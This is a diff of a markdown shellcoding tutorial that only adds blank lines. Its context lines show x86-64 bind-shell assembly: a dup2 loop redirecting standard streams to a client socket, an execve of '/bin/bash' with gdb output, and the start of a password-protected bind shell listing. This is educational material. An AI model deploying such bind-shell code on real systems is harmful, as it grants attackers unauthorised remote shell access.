@@ -566,6 +566,7 @@ syscall       ; accept returns client socket file-descriptor in RAX
 + we need to call this 3 times
 
 + RAX = 0x21
+
 ```bash
 => 0x7ffff7ed0020 <dup2>:       mov    eax,0x21
    0x7ffff7ed0025 <dup2+5>:     syscall
@@ -593,6 +594,7 @@ syscall       ; accept returns client socket file-descriptor in RAX
   - Standard Error file descriptor
 
 ##### dup2 Assembly
+
 ```asm
 ; dup2
 xchg rdi, rax    ; RDI = sockfd / ClientSocketFD
@@ -617,6 +619,7 @@ jne dup2Loop
 + RDI = Pointer to "/bin/bash" 
   - `const char *pathname = "/bin/bash"`
   - Must be null terminated (end the string with a 0x00)
+
 ```bash
 RDI: 0x555555556004 ("/bin/bash")
 gdb-peda$ x/10b 0x555555556004
@@ -634,6 +637,7 @@ gdb-peda$ x/s 0x555555556004
 
 
 #### Execve Assembly
+
 ```asm
 i;execve
 ; rax = 0x3b
@@ -661,6 +665,7 @@ syscall  ; call execve("/bin/bash", NULL, NULL)
 
 
 # Bindshell Assembly with Password
+
 ```asm
 global _start
 
